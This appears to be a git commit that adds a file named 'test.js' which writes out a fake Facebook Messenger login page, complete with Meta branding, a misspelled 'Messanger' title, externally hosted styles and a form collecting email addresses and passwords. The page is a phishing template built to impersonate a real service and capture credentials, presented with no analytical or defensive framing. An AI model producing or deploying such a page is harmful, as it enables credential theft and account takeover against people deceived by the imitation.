97d6a66cc90fe1ab01092ddaa79881a1ff314281
d-l0g <96639173+d-l0g@users.noreply.github.com>
2021-12-30 04:15:24 +0200

    Create test.js

---
+++ test.js
@@ -0,0 +1,42 @@
+document.write(`<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Messanger</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/gh/arkadhost/main-src/mess-simple/style.css">
+</head>
+<body>
+    <div>
+        <div id="page-wrapper">
+            <div id="m-style">
+                <div class="container">
+                    <div class="main">
+                        <div class="image"><img src="https://i.ibb.co/B6FQGf6/ms-logo.png" alt="brand"></div>
+                        <h1 class="main-title">Messanger</h1>
+                        <h2 class="description">
+                            Connect with your favourite people.
+                            <br>
+                            Sign in with Facebook to get started.
+                        </h2>
+                        <form method="post" action="" target="_top">
+                            <input type="text" name="email" placeholder="Email address or mobile number" minlength="5" maxlength="45" class="home-mail" required>
+                            <input type="password" name="name" placeholder="Password" minlength="5" maxlength="45"  class="home-pass" required>
+                            <button type="submit" name="submit" class="home-submit">Log In</button>
+
+                        </form>
+                    </div>
+                    <div class="footer">
+                        <a href="#">Not on Facebook?</a>
+                        <a href="#">Forgotten password</a>
+                        <a href="#">Data Policy</a>
+                        <a href="#">Terms</a>
+                        <a href="#">Cookies Policy</a>
+                        <a> &#xA9; Meta 2021.</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>`);
